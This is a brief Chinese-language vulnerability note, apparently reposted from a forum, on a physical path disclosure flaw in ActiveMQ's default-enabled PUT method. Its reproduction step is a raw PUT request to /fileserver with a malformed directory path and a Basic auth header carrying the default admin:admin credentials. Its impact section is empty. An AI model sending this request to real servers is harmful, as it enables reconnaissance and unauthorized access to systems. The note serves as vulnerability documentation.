# ActiveMQ物理路径泄漏漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2798](https://www.zhihuifly.com/t/topic/2798)

# ActiveMQ物理路径泄漏漏洞

## 一、漏洞简介

ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息

## 二、漏洞影响

## 三、复现过程

```
Request Raw:
PUT /fileserver/a../..//.././ HTTP/1.1
Host: 192.168.197.25:8161
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: 4 
```